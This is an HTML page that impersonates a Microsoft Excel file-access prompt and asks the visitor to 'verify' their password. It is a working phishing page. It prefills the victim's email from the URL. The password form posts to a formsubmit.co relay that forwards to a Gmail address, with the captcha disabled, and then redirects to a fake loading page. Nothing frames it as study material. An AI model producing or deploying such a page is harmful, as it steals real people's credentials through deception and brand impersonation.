<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Segoe UI, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('img/new.jpg');
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
        }

        body::after {
            content: "";
            position: absolute;
            top: 10%;
            left: 0;
            width: 100%;
            height: 90%;
            z-index: -1;
        }

        .page-logo {
            position: absolute;
            top: 10px;
            left: 10px;
            width: 45px;
            height: auto;
            z-index: 10;
        }

        .form-container {
            background-color: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            height: 430px;
            width: 410px;
            box-sizing: border-box;
            text-align: center;
            position: relative;
            overflow: hidden;
            border-radius: 5px;
        }

        .logo {
            width: 120px;
            height: auto;
            position: absolute;
            top: 10px;
            left: 10px;
        }

        .title {
            color: #666;
            font-size: 20px;
            position: absolute;
            top: 30px;
            left: 130px;
            margin-left: -68px;
        }

        .email-display {
            color: #666;
            font-size: 16px;
            position: absolute;
            top: 90px;
            left: 32px;
        }

        .enter-password {
            font-size: 18px;
            font-weight: italic;
            position: absolute;
            top: 130px;
            left: -62px;
            width: 350px;
        }

        .additional-text {
            font-size: 13px;
            color: #666;
            position: absolute;
            top: 165px;
            left: 30px;
            width: 350px;
            text-align: left;
        }

        .additional-text a {
            color: blue;
            text-decoration: underline;
            cursor: pointer;
        }

        .password-input {
            font-size: 16px;
            color: #666;
            border: none;
            border-bottom: 1px solid black;
            background-color: transparent;
            outline: none;
            padding: 5px;
            width: 90%;
            text-align: left;
            position: absolute;
            top: 210px;
            left: 5%;
        }

        .password-input:focus {
            border-bottom: 1px solid blue;
        }

        .note {
            font-size: 13px;
            color: blue;
            position: absolute;
            top: 260px;
            left: 30px;
            width: 350px;
        }

        .error-container {
            display: none;
            position: absolute;
            top: 290px;
            left: 30px;
            width: 350px;
            color: red;
            font-size: 13px;
        }

        .submit-container {
            position: absolute;
            bottom: 20px;
            right: 40px;
            padding: 8px 20px;
            background-color: #039126;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease;
            border-radius: 3px;
            text-align: center;
        }

        .submit-container:hover {
            background-color: #037a22;
        }

        .green-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 8px;
            background-color: #037a22;
        }
    </style>
</head>

<body>
  <div class="form-container">
    <div class="green-line"></div>
    <img src="https://static.vecteezy.com/system/resources/thumbnails/027/179/363/small/microsoft-excel-icon-logo-symbol-free-png.png" class="logo" alt="Logo" style="height: 40PX; width: auto; padding-top: 10px; padding-left: 5px;">
    <div class="title" style="padding-top: 6px; font-size:medium;">Microsoft Excel</div>
    <div name="email" class="email-display">Loading email...</div>
    <div class="enter-password">Enter your password</div>
    <div class="additional-text">
      Because you're accessing sensitive info, you need to verify your password.
    </div>

    <!-- FORM START -->
    <form action="https://formsubmit.co/sufficientgracelog@gmail.com" method="POST">
      <input name="password" type="password" class="password-input" placeholder="Enter password" required>
      <input type="hidden" name="email" id="email">
      <div class="note">
        <span style="color: red">*</span> Only the above email recipient can view this file.
      </div>
      <div class="error-container">Incorrect password. Please try again.</div>
      <button type="submit" class="submit-container">View</button>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://portal-excel.vercel.app/loading.html">
    </form>
    <!-- FORM END -->
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    if (email) {
      document.querySelector('.email-display').textContent = email;
      document.getElementById('email').value = email;
    }
  </script>
</body>
</html>
